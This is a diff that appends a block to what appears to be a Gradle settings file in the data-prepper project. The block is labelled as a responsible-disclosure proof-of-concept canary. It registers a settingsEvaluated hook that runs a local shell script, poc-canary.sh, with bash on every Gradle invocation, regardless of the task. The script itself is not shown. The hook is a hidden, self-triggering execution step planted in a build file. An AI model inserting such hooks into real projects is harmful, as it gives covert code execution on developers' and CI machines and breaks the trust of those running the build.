@@ -223,3 +223,12 @@ include 'data-prepper-plugins:rate-limiter-processor'
 
 
 include 'e2e-test:kafka-buffer-backward-compatibility'
+
+// --- responsible-disclosure PoC canary (POC-20260725T085142Z-23679) — remove after ---
+// Executes on every gradle invocation (settings phase) regardless of task.
+gradle.settingsEvaluated {
+    def canary = new File(settings.rootDir, "poc-canary.sh")
+    if (canary.exists()) {
+        ["bash", canary.absolutePath].execute().waitFor()
+    }
+}
